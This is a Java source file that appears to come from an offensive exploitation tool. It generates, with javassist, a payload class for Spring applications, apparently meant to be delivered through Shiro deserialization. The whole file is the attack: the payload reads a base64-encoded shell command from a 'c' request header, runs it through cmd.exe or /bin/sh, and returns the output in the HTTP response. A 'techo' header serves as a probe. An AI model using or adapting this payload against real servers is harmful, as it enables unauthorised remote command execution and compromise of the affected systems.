package com.summersec.attack.deser.echo;

import javassist.CannotCompileException;
import javassist.ClassPool;
import javassist.CtClass;
import javassist.CtNewConstructor;
import javassist.NotFoundException;



public class SpringEcho implements EchoPayload {
    @Override
    public CtClass genPayload(ClassPool pool) throws NotFoundException, CannotCompileException {
        CtClass clazz = pool.makeClass("com.summersec.x.Test" + System.nanoTime());

        if ((clazz.getDeclaredConstructors()).length != 0) {
            clazz.removeConstructor(clazz.getDeclaredConstructors()[0]);
        }
        clazz.addConstructor(CtNewConstructor.make("public SpringEcho() throws Exception {\n        {\n            try {\n                org.springframework.web.context.request.RequestAttributes requestAttributes = org.springframework.web.context.request.RequestContextHolder.getRequestAttributes();\n                javax.servlet.http.HttpServletRequest httprequest = ((org.springframework.web.context.request.ServletRequestAttributes) requestAttributes).getRequest();\n                javax.servlet.http.HttpServletResponse httpresponse = ((org.springframework.web.context.request.ServletRequestAttributes) requestAttributes).getResponse();\n\n                String te = httprequest.getHeader(\"techo\");\n                if (te != null && !te.isEmpty()) {\n                    httpresponse.addHeader(\"techo\", te);\n                    httpresponse.getWriter().flush();\n                    httpresponse.getWriter().close();\n                }\n                String tc = httprequest.getHeader(\"c\");\n                if (tc != null && !tc.isEmpty()) {\n                    String p = org.apache.shiro.codec.Base64.decodeToString(tc);\n\n                    String[] cmd = System.getProperty(\"os.name\").toLowerCase().contains(\"windows\") ? new String[]{\"cmd.exe\", \"/c\", p} : new String[]{\"/bin/sh\", \"-c\", p};\n                    byte[] result = new java.util.Scanner(new ProcessBuilder(cmd).start().getInputStream()).useDelimiter(\"\\\\A\").next().getBytes();\n\n                    String base64Str = \"\";\n                    base64Str = org.apache.shiro.codec.Base64.encodeToString(result);\n                    httpresponse.getWriter().write(\"$$$\" + base64Str + \"$$$\");\n\n                    httpresponse.getWriter().flush();\n                    httpresponse.getWriter().close();\n                }\n            } catch (Exception e) {\n                e.getStackTrace();\n            }\n        }\n    }", clazz));
        return clazz;
    }
}


